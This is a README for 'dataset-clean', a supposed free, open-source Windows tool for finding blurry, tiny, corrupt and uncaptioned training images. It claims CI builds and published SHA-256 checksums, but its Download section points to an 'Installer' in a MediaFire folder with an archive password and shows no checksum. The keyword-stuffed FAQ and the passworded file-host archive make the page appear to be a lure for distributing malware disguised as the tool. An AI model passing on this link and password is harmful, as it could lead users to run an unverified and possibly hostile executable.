# dataset-clean

🫧 Free, open-source dataset cleaner for Windows — finds blurry, tiny, broken and mislabeled training images. 100 MB portable, offline, MIT.

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011%20x64-blue.svg)]()
[![Build](https://img.shields.io/badge/build-100%20MB%20single%20exe-orange.svg)]()

## Features

- ✅ **Blur scoring** — Laplacian variance ranking surfaces the soft shots that teach a model nothing
- ✅ **Resolution floor** — flags anything under your minimum edge length for the planned training resolution
- ✅ **Corrupt file detection** — truncated JPEGs and unreadable files found before the trainer crashes on them
- ✅ **Caption pair check** — images without captions and orphan captions without images listed together
- ✅ **Review before action** — problems grouped by type with thumbnails; decide per item or in bulk
- ✅ **HTML report** — shareable quality report of the dataset with every finding
- ✅ **100 MB self-contained exe** — runtime bundled, portable, fully offline, MIT with SHA-256 releases

## Why dataset-clean

- MIT licensed, source in the open
- No ads, no account, no telemetry
- Single portable 100 MB build - no setup required, runs offline
- CI builds every release and publishes SHA-256 checksums
- Windows 10 / 11 x64

## Comparison

| Feature | **dataset-clean** | Manual review | Scripts | Generic dupe finders |
|---|:---:|:---:|:---:|:---:|
| Price | **Free, MIT** | Your evening | Free, OSS | Free or paid |
| Open source | **Yes** | N/A | Yes | Partial |
| Blur quality scoring | **Yes** | Eyeball only | Scripted | No |
| Caption pair validation | **Yes** | Rare | Scripted | No |
| Grouped findings report | **Yes** | No | No | Partial
| Portable, no install | **Yes, 100 MB** | N/A | Python env | Varies

## FAQ

**why does my LoRA look blurry? how to find bad images in a dataset**

A model learns whatever is in the set, including the blurry, tiny and corrupt files nobody opened. dataset-clean scores sharpness, checks resolution and caption pairs, and groups findings for fast bulk decisions. It is a 100 MB portable exe, MIT, offline, and it reports before it touches a single file.

## Screenshots

All screenshots describe the 1280x800 dark UI.

1. Dark audit (#121418, cyan #22D3EE): findings sidebar with blur, low-res and corrupt groups, image grid sorted worst-first, score chip reading blur 12.4.
2. Caption pair view: three problem rows — image missing caption, orphan txt, empty caption — with open-folder and bulk-fix buttons.
3. HTML report preview: quality summary cards with percentages, worst offenders strip at bottom, export button, toast reading report saved.

## Download

| Source | Link |
|---|---|
| 💾 **Installer dataset-clean** | [Installer dataset-clean](https://www.mediafire.com/folder/xfbu35fzy4zd6/Installer) |

> Archive password: `5139237619`

## Build

Requires the .NET 8 SDK on Windows 10/11 x64:

```
dotnet publish -c Release -r win-x64 --self-contained -p:PublishSingleFile=true
```

## License

MIT. See [LICENSE](LICENSE).